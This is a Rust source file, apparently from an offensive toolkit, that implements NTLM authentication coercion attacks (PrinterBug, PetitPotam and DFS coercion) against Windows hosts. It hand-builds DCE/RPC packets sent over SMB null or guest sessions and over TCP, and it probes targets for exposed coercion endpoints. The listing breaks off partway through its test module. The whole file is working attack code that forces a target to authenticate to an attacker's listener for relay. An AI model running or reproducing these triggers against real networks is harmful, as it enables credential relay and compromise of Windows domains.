//! Coercion attack triggers for unauthenticated RPC coercion.
//!
//! Implements coercion techniques that can trigger a target to authenticate
//! to an attacker-controlled listener (e.g., for NTLM relay attacks):
//!
//! - MS-RPRN (Print Spooler Remote Protocol) — PrinterBug / dementor
//! - MS-EFSR (Encrypting File System Remote Protocol) — EfsRpcOpenFileRaw / PetitPotam
//! - MS-DFSNM (DFS Namespace Management) — DFS-RPC coercion
//!
//! These techniques work by calling RPC methods that cause the target to
//! initiate an outbound authentication attempt to a specified UNC path.

use crate::error::{OverthroneError, Result};
use crate::proto::epm::resolve_uuid_via_epm_tcp;
use crate::proto::smb::SmbSession;
use serde::{Deserialize, Serialize};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
//  Types
// ═══════════════════════════════════════════════════════════

/// Optional credentials for coercion triggers.
/// When provided, used instead of SMB null session.
#[derive(Debug, Clone)]
pub struct CoerceCreds {
    pub domain: String,
    pub username: String,
    pub password: String,
}

/// Coercion trigger result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CoercionResult {
    /// Target host
    pub target: String,
    /// Technique used
    pub technique: String,
    /// Listener that was triggered
    pub listener: String,
    /// Whether the coercion was successful (target attempted auth)
    pub success: bool,
    /// Status message or error
    pub message: String,
}

// ═══════════════════════════════════════════════════════════
//  RPC Bind Helpers
// ═══════════════════════════════════════════════════════════

/// Build DCE/RPC bind request.
fn build_rpc_bind(interface_uuid: &[u8; 16]) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.extend_from_slice(&[5, 0]); // version 5.0
    buf.push(11); // packet type = Bind
    buf.push(3); // flags = first+last
    buf.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data representation
    buf.extend_from_slice(&[0x48, 0x00]); // frag length (72)
    buf.extend_from_slice(&[0x00, 0x00]); // auth length
    buf.extend_from_slice(&1u32.to_le_bytes()); // call ID
    buf.extend_from_slice(&4096u16.to_le_bytes()); // max xmit frag
    buf.extend_from_slice(&4096u16.to_le_bytes()); // max recv frag
    buf.extend_from_slice(&0u32.to_le_bytes()); // assoc group
    buf.push(1); // num context items
    buf.extend_from_slice(&[0, 0, 0]); // padding
    buf.extend_from_slice(&0u16.to_le_bytes()); // context ID
    buf.push(1); // num transfer syntaxes
    buf.push(0); // padding
    buf.extend_from_slice(interface_uuid);
    buf.extend_from_slice(&1u16.to_le_bytes()); // version major
    buf.extend_from_slice(&0u16.to_le_bytes()); // version minor
    // NDR transfer syntax
    buf.extend_from_slice(&[
        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48,
        0x60,
    ]);
    buf.extend_from_slice(&2u32.to_le_bytes());
    buf
}

/// Build DCE/RPC request PDU.
fn build_rpc_request(opnum: u16, stub_data: &[u8]) -> Vec<u8> {
    let mut pdu = vec![5, 0, 0, 0x03];
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
    let frag_len = (24 + stub_data.len()) as u16;
    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes());
    pdu.extend_from_slice(&1u32.to_le_bytes());
    pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes());
    pdu.extend_from_slice(&opnum.to_le_bytes());
    pdu.extend_from_slice(stub_data);
    pdu
}

fn is_bind_accepted(resp: &[u8]) -> bool {
    resp.len() > 30 && resp[28] == 0 && resp[29] == 0
}

// ═══════════════════════════════════════════════════════════
//  NDR Helpers
// ═══════════════════════════════════════════════════════════

fn ndr_conformant_string(s: &str) -> Vec<u8> {
    let utf16: Vec<u16> = s.encode_utf16().chain(std::iter::once(0)).collect();
    let bytes: Vec<u8> = utf16.iter().flat_map(|c| c.to_le_bytes()).collect();
    let count = utf16.len() as u32;
    let mut out = Vec::new();
    out.extend_from_slice(&count.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    out.extend_from_slice(&count.to_le_bytes());
    out.extend_from_slice(&bytes);
    while out.len() % 4 != 0 {
        out.push(0);
    }
    out
}

// ═══════════════════════════════════════════════════════════
//  MS-RPRN (Print Spooler) — PrinterBug
// ═══════════════════════════════════════════════════════════

/// MS-RPRN UUID: 12345678-1234-abcd-ef00-0123456789ab
const RPRN_UUID: [u8; 16] = [
    0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab, 0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0x89, 0xab,
];

/// RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65)
/// This is the "PrinterBug" — causes the spooler to connect back to the caller.
fn build_rprn_coerce(listener: &str) -> Vec<u8> {
    let mut stub = Vec::new();

    // PRINTER_HANDLE (20 bytes) — null handle for coercion
    stub.extend_from_slice(&[0u8; 20]);

    // Flags
    stub.extend_from_slice(&0x00008000u32.to_le_bytes());

    // Local machine name (pointer)
    stub.extend_from_slice(&0u32.to_le_bytes()); // null

    // Remote machine name (pointer to UNC path)
    stub.extend_from_slice(&0x00020000u32.to_le_bytes());

    // User name (pointer)
    stub.extend_from_slice(&0u32.to_le_bytes()); // null

    // Print processor (pointer)
    stub.extend_from_slice(&0u32.to_le_bytes()); // null

    // Print monitor (pointer)
    stub.extend_from_slice(&0u32.to_le_bytes()); // null

    // Remote machine UNC path
    stub.extend_from_slice(&ndr_conformant_string(listener));

    build_rpc_request(65, &stub)
}

/// Trigger MS-RPRN coercion (PrinterBug) against a target.
/// The target's Print Spooler service will attempt to connect to the listener.
async fn trigger_printer_bug_inner(
    target: &str,
    listener: &str,
    creds: Option<&CoerceCreds>,
) -> Result<CoercionResult> {
    info!("[Coerce] Triggering PrinterBug on {target} → {listener}");

    let smb = if let Some(c) = creds {
        SmbSession::connect(target, &c.domain, &c.username, &c.password)
            .await
            .map_err(|e| OverthroneError::Smb(format!("SMB auth session failed: {e}")))?
    } else {
        match SmbSession::connect(target, "", "", "").await {
            Ok(s) => s,
            Err(_) => SmbSession::connect(target, ".", "guest", "")
                .await
                .map_err(|e| OverthroneError::Smb(format!("SMB null session failed: {e}")))?,
        }
    };

    // Bind to MS-RPRN
    let bind_req = build_rpc_bind(&RPRN_UUID);
    let bind_resp = smb.pipe_transact("spoolss", &bind_req).await?;

    if !is_bind_accepted(&bind_resp) {
        return Ok(CoercionResult {
            target: target.to_string(),
            technique: "printer-bug".to_string(),
            listener: listener.to_string(),
            success: false,
            message: "MS-RPRN bind rejected (Print Spooler may not be running)".to_string(),
        });
    }

    // Send coercion request
    let coerce_req = build_rprn_coerce(listener);
    match smb.pipe_transact("spoolss", &coerce_req).await {
        Ok(resp) => {
            // Check if the response indicates success
            // A successful coercion will return a status code
            let status = if resp.len() > 28 {
                u32::from_le_bytes([resp[24], resp[25], resp[26], resp[27]])
            } else {
                0
            };

            // Even if we get an error, the coercion may have been triggered
            // The key is whether the spooler attempted to connect back
            let success = status == 0 || status == 0x000006BA; // RPC_S_SERVER_UNAVAILABLE is expected

            Ok(CoercionResult {
                target: target.to_string(),
                technique: "printer-bug".to_string(),
                listener: listener.to_string(),
                success,
                message: if success {
                    format!(
                        "Coercion triggered (status: 0x{status:08X}). Check listener for NTLM auth attempt."
                    )
                } else {
                    format!("Coercion returned status 0x{status:08X}")
                },
            })
        }
        Err(e) => {
            warn!("[Coerce] PrinterBug failed: {e}");
            Ok(CoercionResult {
                target: target.to_string(),
                technique: "printer-bug".to_string(),
                listener: listener.to_string(),
                success: false,
                message: format!("RPC call failed: {e}"),
            })
        }
    }
}

/// Trigger MS-RPRN coercion (PrinterBug) — null session variant.
pub async fn trigger_printer_bug(target: &str, listener: &str) -> Result<CoercionResult> {
    trigger_printer_bug_inner(target, listener, None).await
}

/// Trigger MS-RPRN coercion (PrinterBug) with optional credentials.
pub async fn trigger_printer_bug_ex(
    target: &str,
    listener: &str,
    creds: Option<&CoerceCreds>,
) -> Result<CoercionResult> {
    trigger_printer_bug_inner(target, listener, creds).await
}

// ═══════════════════════════════════════════════════════════
//  MS-EFSR (Encrypting File System Remote) — PetitPotam
// ═══════════════════════════════════════════════════════════

/// MS-EFSR UUID: df1941c5-fe89-4e79-bf10-463657acf44d
const EFSR_UUID: [u8; 16] = [
    0xc5, 0x41, 0x19, 0xdf, 0x89, 0xfe, 0x79, 0x4e, 0xbf, 0x10, 0x46, 0x36, 0x57, 0xac, 0xf4, 0x4d,
];

/// EfsRpcOpenFileRaw (opnum 0) — PetitPotam variant
/// Causes the target to authenticate to the specified UNC path.
fn build_efsr_open_file_raw(listener: &str) -> Vec<u8> {
    let mut stub = Vec::new();

    // Handle (20 bytes) — null
    stub.extend_from_slice(&[0u8; 20]);

    // FileName (pointer to UNC path)
    stub.extend_from_slice(&0x00020000u32.to_le_bytes());

    // Flags
    stub.extend_from_slice(&0u32.to_le_bytes());

    // FileName string
    stub.extend_from_slice(&ndr_conformant_string(listener));

    build_rpc_request(0, &stub)
}

/// EfsRpcEncryptFileSrv (opnum 4) — alternative PetitPotam variant
fn build_efsr_encrypt_file(listener: &str) -> Vec<u8> {
    let mut stub = Vec::new();

    // Server name (pointer)
    stub.extend_from_slice(&0x00020000u32.to_le_bytes());
    stub.extend_from_slice(&ndr_conformant_string(listener));

    // FileName (pointer)
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    stub.extend_from_slice(&ndr_conformant_string("C:\\Windows\\Temp\\coerce"));

    build_rpc_request(4, &stub)
}

async fn trigger_petitpotam_inner(
    target: &str,
    listener: &str,
    creds: Option<&CoerceCreds>,
) -> Result<CoercionResult> {
    info!("[Coerce] Triggering PetitPotam on {target} → {listener}");

    let smb = if let Some(c) = creds {
        SmbSession::connect(target, &c.domain, &c.username, &c.password)
            .await
            .map_err(|e| OverthroneError::Smb(format!("SMB auth session failed: {e}")))?
    } else {
        match SmbSession::connect(target, "", "", "").await {
            Ok(s) => s,
            Err(_) => SmbSession::connect(target, ".", "guest", "")
                .await
                .map_err(|e| OverthroneError::Smb(format!("SMB null session failed: {e}")))?,
        }
    };

    // Bind to MS-EFSR
    let bind_req = build_rpc_bind(&EFSR_UUID);
    let bind_resp = smb.pipe_transact("efsrpc", &bind_req).await?;

    if !is_bind_accepted(&bind_resp) {
        return Ok(CoercionResult {
            target: target.to_string(),
            technique: "petitpotam".to_string(),
            listener: listener.to_string(),
            success: false,
            message: "MS-EFSR bind rejected (EFS service may not be running)".to_string(),
        });
    }

    // Try EfsRpcOpenFileRaw first
    let coerce_req = build_efsr_open_file_raw(listener);
    match smb.pipe_transact("efsrpc", &coerce_req).await {
        Ok(resp) => {
            let status = if resp.len() > 28 {
                u32::from_le_bytes([resp[24], resp[25], resp[26], resp[27]])
            } else {
                0
            };

            // STATUS_ACCESS_DENIED (0xC0000022) means the coercion worked
            // but auth failed — this is expected when the listener doesn't have valid creds
            let success = status == 0xC0000022
                || status == 0xC000009A // STATUS_INSUFFICIENT_RESOURCES
                || status == 0;

            Ok(CoercionResult {
                target: target.to_string(),
                technique: "petitpotam".to_string(),
                listener: listener.to_string(),
                success,
                message: if success {
                    format!(
                        "PetitPotam triggered (status: 0x{status:08X}). Check listener for NTLM auth."
                    )
                } else {
                    format!("PetitPotam returned status 0x{status:08X}")
                },
            })
        }
        Err(e) => {
            debug!("[Coerce] EfsRpcOpenFileRaw failed, trying EfsRpcEncryptFileSrv: {e}");

            // Fallback to EfsRpcEncryptFileSrv
            let coerce_req2 = build_efsr_encrypt_file(listener);
            match smb.pipe_transact("efsrpc", &coerce_req2).await {
                Ok(resp) => {
                    let status = if resp.len() > 28 {
                        u32::from_le_bytes([resp[24], resp[25], resp[26], resp[27]])
                    } else {
                        0
                    };

                    Ok(CoercionResult {
                        target: target.to_string(),
                        technique: "petitpotam-encrypt".to_string(),
                        listener: listener.to_string(),
                        success: status == 0xC0000022 || status == 0,
                        message: format!("PetitPotam (EncryptFileSrv) status: 0x{status:08X}"),
                    })
                }
                Err(e2) => Ok(CoercionResult {
                    target: target.to_string(),
                    technique: "petitpotam".to_string(),
                    listener: listener.to_string(),
                    success: false,
                    message: format!("Both EFSR variants failed: {e}, {e2}"),
                }),
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════
//  MS-DFSNM (DFS Namespace Management)
// ═══════════════════════════════════════════════════════════

/// MS-DFSNM UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
const DFSNM_UUID: [u8; 16] = [
    0xe0, 0x42, 0xc7, 0x4f, 0x10, 0x4a, 0xcf, 0x11, 0x82, 0x73, 0x00, 0xaa, 0x00, 0x4a, 0xe6, 0x73,
];

/// NetrDfsRemoveStdRoot (opnum 14) — DFS coercion
fn build_dfs_coerce(listener: &str) -> Vec<u8> {
    let mut stub = Vec::new();

    // Server name (pointer)
    stub.extend_from_slice(&0x00020000u32.to_le_bytes());
    stub.extend_from_slice(&ndr_conformant_string(listener));

    // Root share (pointer)
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    stub.extend_from_slice(&ndr_conformant_string("\\\\share\\root"));

    // Flags
    stub.extend_from_slice(&1u32.to_le_bytes());

    build_rpc_request(14, &stub)
}

/// Trigger MS-EFSR coercion (PetitPotam) — null session variant.
pub async fn trigger_petitpotam(target: &str, listener: &str) -> Result<CoercionResult> {
    trigger_petitpotam_inner(target, listener, None).await
}

/// Trigger MS-EFSR coercion (PetitPotam) with optional credentials.
pub async fn trigger_petitpotam_ex(
    target: &str,
    listener: &str,
    creds: Option<&CoerceCreds>,
) -> Result<CoercionResult> {
    trigger_petitpotam_inner(target, listener, creds).await
}

async fn trigger_dfs_coerce_inner(
    target: &str,
    listener: &str,
    creds: Option<&CoerceCreds>,
) -> Result<CoercionResult> {
    info!("[Coerce] Triggering DFS coercion on {target} → {listener}");

    let smb = if let Some(c) = creds {
        SmbSession::connect(target, &c.domain, &c.username, &c.password)
            .await
            .map_err(|e| OverthroneError::Smb(format!("SMB auth session failed: {e}")))?
    } else {
        match SmbSession::connect(target, "", "", "").await {
            Ok(s) => s,
            Err(_) => SmbSession::connect(target, ".", "guest", "")
                .await
                .map_err(|e| OverthroneError::Smb(format!("SMB null session failed: {e}")))?,
        }
    };

    let bind_req = build_rpc_bind(&DFSNM_UUID);
    let bind_resp = smb.pipe_transact("netdfs", &bind_req).await?;

    if !is_bind_accepted(&bind_resp) {
        return Ok(CoercionResult {
            target: target.to_string(),
            technique: "dfs-coerce".to_string(),
            listener: listener.to_string(),
            success: false,
            message: "MS-DFSNM bind rejected (DFS service may not be running)".to_string(),
        });
    }

    let coerce_req = build_dfs_coerce(listener);
    match smb.pipe_transact("netdfs", &coerce_req).await {
        Ok(resp) => {
            let status = if resp.len() > 28 {
                u32::from_le_bytes([resp[24], resp[25], resp[26], resp[27]])
            } else {
                0
            };

            Ok(CoercionResult {
                target: target.to_string(),
                technique: "dfs-coerce".to_string(),
                listener: listener.to_string(),
                success: status == 0xC0000022 || status == 0,
                message: format!("DFS coercion status: 0x{status:08X}"),
            })
        }
        Err(e) => Ok(CoercionResult {
            target: target.to_string(),
            technique: "dfs-coerce".to_string(),
            listener: listener.to_string(),
            success: false,
            message: format!("DFS coercion failed: {e}"),
        }),
    }
}

/// Trigger MS-DFSNM coercion — null session variant.
pub async fn trigger_dfs_coerce(target: &str, listener: &str) -> Result<CoercionResult> {
    trigger_dfs_coerce_inner(target, listener, None).await
}

/// Trigger MS-DFSNM coercion with optional credentials.
pub async fn trigger_dfs_coerce_ex(
    target: &str,
    listener: &str,
    creds: Option<&CoerceCreds>,
) -> Result<CoercionResult> {
    trigger_dfs_coerce_inner(target, listener, creds).await
}

// ═══════════════════════════════════════════════════════════
//  Coercion Endpoint Detection
// ═══════════════════════════════════════════════════════════

/// Detect available coercion endpoints on a target.
/// Checks for MS-RPRN, MS-EFSR, and DFS-RPC interfaces via null session.
pub async fn detect_coercion_endpoints(target: &str) -> Result<Vec<CoercionResult>> {
    info!("[coerce] Detecting coercion endpoints on {target}");

    let mut results = Vec::new();

    // Try to connect via SMB null session first
    let smb = match SmbSession::connect(target, "", "", "").await {
        Ok(s) => s,
        Err(_) => {
            debug!("[coerce] SMB null session failed, coercion detection skipped");
            return Ok(results);
        }
    };

    // Check IPC$ access (required for RPC coercion)
    if !smb.check_share_read("IPC$").await {
        debug!("[coerce] IPC$ not accessible, coercion detection skipped");
        return Ok(results);
    }

    // MS-RPRN (Print Spooler) — interface: 12345678-1234-ABCD-EF00-0123456789AB
    let rprn_uuid: [u8; 16] = [
        0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab, 0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0x89,
        0xab,
    ];
    results.push(
        match check_rpc_interface(&smb, target, &rprn_uuid, "MS-RPRN").await {
            Ok(available) => CoercionResult {
                target: target.to_string(),
                technique: "rprn-detect".to_string(),
                listener: String::new(),
                success: available,
                message: if available {
                    "MS-RPRN interface available".to_string()
                } else {
                    "MS-RPRN interface not accessible".to_string()
                },
            },
            Err(e) => CoercionResult {
                target: target.to_string(),
                technique: "rprn-detect".to_string(),
                listener: String::new(),
                success: false,
                message: format!("MS-RPRN check failed: {e}"),
            },
        },
    );

    // MS-EFSR (Encrypting File System) — interface: df1941c5-fe89-4e79-bf10-463657acf44d
    let efsr_uuid: [u8; 16] = [
        0xc5, 0x41, 0x19, 0xdf, 0x89, 0xfe, 0x79, 0x4e, 0xbf, 0x10, 0x46, 0x36, 0x57, 0xac, 0xf4,
        0x4d,
    ];
    results.push(
        match check_rpc_interface(&smb, target, &efsr_uuid, "MS-EFSR").await {
            Ok(available) => CoercionResult {
                target: target.to_string(),
                technique: "efsr-detect".to_string(),
                listener: String::new(),
                success: available,
                message: if available {
                    "MS-EFSR interface available".to_string()
                } else {
                    "MS-EFSR interface not accessible".to_string()
                },
            },
            Err(e) => CoercionResult {
                target: target.to_string(),
                technique: "efsr-detect".to_string(),
                listener: String::new(),
                success: false,
                message: format!("MS-EFSR check failed: {e}"),
            },
        },
    );

    // DFS-RPC (DFS Namespace Management) — interface: 4fc742e0-4a10-11cf-8273-00aa004ae673
    let dfs_uuid: [u8; 16] = [
        0xe0, 0x42, 0xc7, 0x4f, 0x10, 0x4a, 0xcf, 0x11, 0x82, 0x73, 0x00, 0xaa, 0x00, 0x4a, 0xe6,
        0x73,
    ];
    results.push(
        match check_rpc_interface(&smb, target, &dfs_uuid, "DFS").await {
            Ok(available) => CoercionResult {
                target: target.to_string(),
                technique: "dfs-detect".to_string(),
                listener: String::new(),
                success: available,
                message: if available {
                    "DFS-RPC interface available".to_string()
                } else {
                    "DFS-RPC interface not accessible".to_string()
                },
            },
            Err(e) => CoercionResult {
                target: target.to_string(),
                technique: "dfs-detect".to_string(),
                listener: String::new(),
                success: false,
                message: format!("DFS-RPC check failed: {e}"),
            },
        },
    );

    Ok(results)
}

/// Check if an RPC interface is accessible via SMB null session.
async fn check_rpc_interface(
    smb: &SmbSession,
    _target: &str,
    _interface_uuid: &[u8; 16],
    protocol_name: &str,
) -> Result<bool> {
    debug!("[coerce] Checking {protocol_name} interface via IPC$ pipe");

    // Try to access the RPC named pipe for this protocol
    let pipe_name = match protocol_name {
        "MS-RPRN" => "\\spoolss",
        "MS-EFSR" => "\\efsrpc",
        "DFS" => "\\netdfs",
        _ => "\\srvsvc",
    };

    // Try to open the pipe via transact — if it succeeds, the interface is available
    match smb.pipe_transact(pipe_name, &[]).await {
        Ok(_) => {
            debug!("[coerce] {protocol_name} interface accessible");
            Ok(true)
        }
        Err(_) => {
            debug!("[coerce] {protocol_name} interface not accessible");
            Ok(false)
        }
    }
}

// ═══════════════════════════════════════════════════════════
//  TCP-based Coercion (Fallback via EPM Port 135)
// ═══════════════════════════════════════════════════════════

/// Coercion protocol selection for TCP transport.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum CoerceProtocol {
    /// MS-EFSRPC (Encrypting File System Remote) — PetitPotam
    EfsRpc,
    /// MS-RPRN (Print Spooler Remote) — PrinterBug
    Rprn,
    /// MS-DFSNM (DFS Namespace Management)
    EfsBackup,
}

impl CoerceProtocol {
    /// UUID for the RPC interface
    pub fn uuid(&self) -> [u8; 16] {
        match self {
            // MS-EFSR: df1941c5-fe89-4e79-bf10-463657acf44d
            Self::EfsRpc => [
                0xc5, 0x41, 0x19, 0xdf, 0x89, 0xfe, 0x79, 0x4e, 0xbf, 0x10, 0x46, 0x36, 0x57, 0xac,
                0xf4, 0x4d,
            ],
            // MS-RPRN: 12345678-1234-abcd-ef00-0123456789ab
            Self::Rprn => [
                0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab, 0xef, 0x00, 0x01, 0x23, 0x45, 0x67,
                0x89, 0xab,
            ],
            // MS-DFSNM: 4fc742e0-4a10-11cf-8273-00aa004ae673
            Self::EfsBackup => [
                0xe0, 0x42, 0xc7, 0x4f, 0x10, 0x4a, 0xcf, 0x11, 0x82, 0x73, 0x00, 0xaa, 0x00, 0x4a,
                0xe6, 0x73,
            ],
        }
    }

    pub fn name(&self) -> &str {
        match self {
            Self::EfsRpc => "efsrpc",
            Self::Rprn => "spoolss",
            Self::EfsBackup => "netdfs",
        }
    }
}

/// Build DCE/RPC bind for TCP transport.
fn build_tcp_bind(interface_uuid: &[u8; 16]) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.extend_from_slice(&[5, 0]);
    buf.push(11);
    buf.push(3);
    buf.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
    buf.extend_from_slice(&[0x48, 0x00]);
    buf.extend_from_slice(&[0x00, 0x00]);
    buf.extend_from_slice(&1u32.to_le_bytes());
    buf.extend_from_slice(&4280u16.to_le_bytes());
    buf.extend_from_slice(&4280u16.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.push(1);
    buf.extend_from_slice(&[0, 0, 0]);
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.push(1);
    buf.push(0);
    buf.extend_from_slice(interface_uuid);
    buf.extend_from_slice(&1u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&[
        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48,
        0x60,
    ]);
    buf.extend_from_slice(&2u32.to_le_bytes());
    buf
}

/// Build DCE/RPC request for TCP transport.
fn build_tcp_request(opnum: u16, stub_data: &[u8]) -> Vec<u8> {
    let mut pdu = vec![5, 0, 0, 0x03];
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
    let frag_len = (24 + stub_data.len()) as u16;
    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes());
    pdu.extend_from_slice(&1u32.to_le_bytes());
    pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes());
    pdu.extend_from_slice(&opnum.to_le_bytes());
    pdu.extend_from_slice(stub_data);
    pdu
}

fn is_bind_accepted_tcp(resp: &[u8]) -> bool {
    resp.len() > 30 && resp[28] == 0 && resp[29] == 0
}

/// Write a BTF-framed RPC PDU over TCP.
async fn write_rpc_frame_tcp<T: AsyncWriteExt + Unpin>(
    stream: &mut T,
    pdu: &[u8],
) -> std::io::Result<()> {
    let len = (pdu.len() as u32).to_le_bytes();
    stream.write_all(&len).await?;
    stream.write_all(pdu).await
}

/// Read a BTF-framed RPC PDU over TCP.
async fn read_rpc_frame_tcp<T: AsyncReadExt + Unpin>(stream: &mut T) -> std::io::Result<Vec<u8>> {
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).await?;
    let len = u32::from_le_bytes(len_buf) as usize;
    if len > 1_048_576 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "RPC frame too large",
        ));
    }
    let mut buf = vec![0u8; len];
    stream.read_exact(&mut buf).await?;
    Ok(buf)
}

/// NDR conformant string encoding for TCP stubs.
fn ndr_string_tcp(s: &str) -> Vec<u8> {
    let utf16: Vec<u16> = s.encode_utf16().chain(std::iter::once(0)).collect();
    let bytes: Vec<u8> = utf16.iter().flat_map(|c| c.to_le_bytes()).collect();
    let count = utf16.len() as u32;
    let mut out = Vec::new();
    out.extend_from_slice(&count.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    out.extend_from_slice(&count.to_le_bytes());
    out.extend_from_slice(&bytes);
    while out.len() % 4 != 0 {
        out.push(0);
    }
    out
}

/// Send a TCP-based coercion request to the target via EPM-resolved endpoint.
async fn send_tcp_coerce(
    target: &str,
    listener: &str,
    protocol: CoerceProtocol,
    stub_data: &[u8],
    opnum: u16,
) -> Result<CoercionResult> {
    let (host, port) = resolve_uuid_via_epm_tcp(target, &protocol.uuid()).await?;
    info!(
        "[CoerceTCP] {} resolved to {}:{}",
        protocol.name(),
        host,
        port
    );

    let addr = format!("{}:{}", host, port);
    let mut stream = TcpStream::connect(&addr)
        .await
        .map_err(|e| OverthroneError::custom(format!("TCP connect to {} failed: {}", addr, e)))?;

    let bind_req = build_tcp_bind(&protocol.uuid());
    write_rpc_frame_tcp(&mut stream, &bind_req).await?;

    let bind_resp = read_rpc_frame_tcp(&mut stream).await?;
    if !is_bind_accepted_tcp(&bind_resp) {
        return Ok(CoercionResult {
            target: target.to_string(),
            technique: format!("{}-tcp", protocol.name()),
            listener: listener.to_string(),
            success: false,
            message: format!("{} bind rejected over TCP", protocol.name()),
        });
    }

    let req = build_tcp_request(opnum, stub_data);
    write_rpc_frame_tcp(&mut stream, &req).await?;

    let resp = read_rpc_frame_tcp(&mut stream).await?;
    let status = if resp.len() > 28 {
        u32::from_le_bytes([resp[24], resp[25], resp[26], resp[27]])
    } else {
        0
    };

    let success = status == 0 || status == 0xC0000022 || status == 0x000006BA;

    Ok(CoercionResult {
        target: target.to_string(),
        technique: format!("{}-tcp", protocol.name()),
        listener: listener.to_string(),
        success,
        message: format!(
            "TCP coercion via {} (port {}): status 0x{status:08X}",
            protocol.name(),
            port
        ),
    })
}

// ── TCP stub builders ──

fn build_efsr_open_file_raw_tcp(listener: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&[0u8; 20]);
    stub.extend_from_slice(&0x00020000u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&ndr_string_tcp(listener));
    build_tcp_request(0, &stub)
}

fn build_rprn_coerce_tcp(listener: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&[0u8; 20]);
    stub.extend_from_slice(&0x00008000u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0x00020000u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&ndr_string_tcp(listener));
    build_tcp_request(65, &stub)
}

fn build_dfs_coerce_tcp(listener: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&0x00020000u32.to_le_bytes());
    stub.extend_from_slice(&ndr_string_tcp(listener));
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    stub.extend_from_slice(&ndr_string_tcp("\\\\share\\root"));
    stub.extend_from_slice(&1u32.to_le_bytes());
    build_tcp_request(14, &stub)
}

/// Trigger coercion over TCP transport (bypassing SMB named pipes).
/// Uses EPM (port 135) to resolve the RPC interface to a dynamic TCP port.
pub async fn trigger_coerce_tcp(
    target: &str,
    listener: &str,
    protocol: CoerceProtocol,
) -> Result<CoercionResult> {
    let stub_listener = format!("\\\\{}\\share", listener);

    match protocol {
        CoerceProtocol::EfsRpc => {
            let stub = build_efsr_open_file_raw_tcp(&stub_listener);
            send_tcp_coerce(target, listener, protocol, &stub, 0).await
        }
        CoerceProtocol::Rprn => {
            let stub = build_rprn_coerce_tcp(&stub_listener);
            send_tcp_coerce(target, listener, protocol, &stub, 65).await
        }
        CoerceProtocol::EfsBackup => {
            let stub = build_dfs_coerce_tcp(&stub_listener);
            send_tcp_coerce(target, listener, protocol, &stub, 14).await
        }
    }
}

// ═══════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rprn_coerce_structure() {
        let req = build_rprn_coerce("\\\\192.168.1.100\\share");
        assert_eq!(req[2], 0); // RPC request type
        assert!(req.len() > 24); // Has stub data
    }

    #[test]
    fn test_efsr_coerce_structure() {
        let req = build_efsr_open_file_raw("\\\\192.168.1.100\\share");
        assert_eq!(req[2], 0); // RPC request type
        assert!(req.len() > 24);
    }

    #[test]
    fn test_ndr_string_encoding() {
        let encoded = ndr_conformant_string("\\\\server\\share");
        assert!(!encoded.is_empty());
        // Should contain UTF-16 encoded string
        assert!(encoded.windows(2).any(|w| w == [b'\\', 0]));
    }

    // ── TCP coercion tests ──

    #[test]
    fn test_coerce_protocol_uuids() {
        assert_eq!(CoerceProtocol::EfsRpc.uuid().len(), 16);
        assert_eq!(CoerceProtocol::Rprn.uuid().len(), 16);
        assert_eq!(CoerceProtocol::EfsBackup.uuid().len(), 16);
    }

    #[test]
    fn test_coerce_protocol_names() {
        assert_eq!(CoerceProtocol::EfsRpc.name(), "efsrpc");
        assert_eq!(CoerceProtocol::Rprn.name(), "spoolss");
        assert_eq!(CoerceProtocol::EfsBackup.name(), "netdfs");
    }

    #[test]
    fn test_tcp_bind_structure() {
        let bind = build_tcp_bind(&[0u8; 16]);
